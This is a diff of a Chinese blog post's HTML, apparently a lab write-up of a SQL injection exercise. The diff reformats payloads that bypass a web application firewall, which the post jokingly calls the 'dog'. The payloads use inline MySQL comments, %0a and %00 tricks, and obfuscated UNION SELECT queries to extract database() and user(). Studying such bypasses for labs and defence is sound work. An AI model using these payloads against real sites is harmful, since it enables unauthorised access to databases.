@@ -117,13 +117,23 @@
 <p>第一关<br>输入一个单引号’报错<br>报错语句：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
 <p>通过报错语句可以初步判断为字符型注入<br>尝试闭合<br>1’ –+-  返回成功，说明成功闭合语句</p>
-<h2 id="order-by-绕过"><a href="#order-by-绕过" class="headerlink" title="order by 绕过"></a>order by 绕过</h2><p>尝试查询字段<br>‘’’<br>1’ order by 1 –+-<br>‘’’<br>提交，狗出来了，这时候就需要祭出打狗棍法了！！！，此棍法无狗不出。<br>尝试空格替换成/<strong>/, 被咬真疼！！<br>尝试内联注释:<br>‘’’<br>/<em>!50000order</em>//<em>!50000by</em>/ 这狗牙齿有点锋利，被咬了<br>‘’’<br>放绝招了：<br>‘’’<br>1’–+-a%0aorder–+-a%0aby–+-a%0a1–+-<br>‘’’<br>哎呀和，又被咬了，杠上了杠上了<br>那就给你整复杂一点，让你咬不动<br>‘’’<br>1’ order/<em>|–|</em>/–+aaaa%20%0a/<em>!10044by</em>//</strong>/3–+-<br>‘’’’<br>我就问你一句老弟你懵不懵？<br>懵了懵了！！！！！<br>成功干翻狗子</p>
+<h2 id="order-by-绕过"><a href="#order-by-绕过" class="headerlink" title="order by 绕过"></a>order by 绕过</h2><p>尝试查询字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 1 --+-</span><br></pre></td></tr></table></figure>
+<p>提交，狗出来了，这时候就需要祭出打狗棍法了！！！，此棍法无狗不出。<br>尝试空格替换成/**/, 被咬真疼！！<br>尝试内联注释:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*!50000order*&#x2F;&#x2F;*!50000by*&#x2F; 这狗牙齿有点锋利，被咬了</span><br></pre></td></tr></table></figure>
+<p>放绝招了：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;--+-a%0aorder--+-a%0aby--+-a%0a1--+-</span><br></pre></td></tr></table></figure>
+<p>哎呀和，又被咬了，杠上了杠上了<br>那就给你整复杂一点，让你咬不动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order&#x2F;*|--|*&#x2F;--+aaaa%20%0a&#x2F;*!10044by*&#x2F;&#x2F;**&#x2F;3--+-</span><br></pre></td></tr></table></figure>
+<p>我就问你一句老弟你懵不懵？<br>懵了懵了！！！！！<br>成功干翻狗子</p>
 <h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><p>不断尝试，不断被咬</p>
 <p>杠上了！杠上了！</p>
 <p>终于配合%00让狗子看懵了</p>
-<p>‘’’<br>‘/<em>|–|</em>//<em>!10044UnIon</em>//<em>%00</em>/–+aaaa%20%0a/<em>!10044SeLECT</em>//**/11111,2222,3333–+-<br>‘’’</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#x2F;*|--|*&#x2F;&#x2F;*!10044UnIon*&#x2F;&#x2F;*%00*&#x2F;--+aaaa%20%0a&#x2F;*!10044SeLECT*&#x2F;&#x2F;**&#x2F;11111,2222,3333--+-</span><br></pre></td></tr></table></figure>
+
 <p>狗子表示很懵逼，这啥玩意啊？</p>
-<h2 id="绕过敏感函数"><a href="#绕过敏感函数" class="headerlink" title="绕过敏感函数"></a>绕过敏感函数</h2><p>‘’’<br>-1’/<em>|–|</em>//<em>!10044UnIon</em>//<em>%00</em>/–+aaaa%20%0a/<em>!10044SeLECT</em>//<em>*/1111,database/</em>!10044(<em>/),user/</em>!10044(*/)–+-<br>‘’’<br>狗子表示看不懂看不懂</p>
+<h2 id="绕过敏感函数"><a href="#绕过敏感函数" class="headerlink" title="绕过敏感函数"></a>绕过敏感函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;*|--|*&#x2F;&#x2F;*!10044UnIon*&#x2F;&#x2F;*%00*&#x2F;--+aaaa%20%0a&#x2F;*!10044SeLECT*&#x2F;&#x2F;**&#x2F;1111,database&#x2F;*!10044(*&#x2F;),user&#x2F;*!10044(*&#x2F;)--+-\</span><br></pre></td></tr></table></figure>
+<p>狗子表示看不懂看不懂</p>
 ]]></content>
       <categories>
         <category>渗透</category>
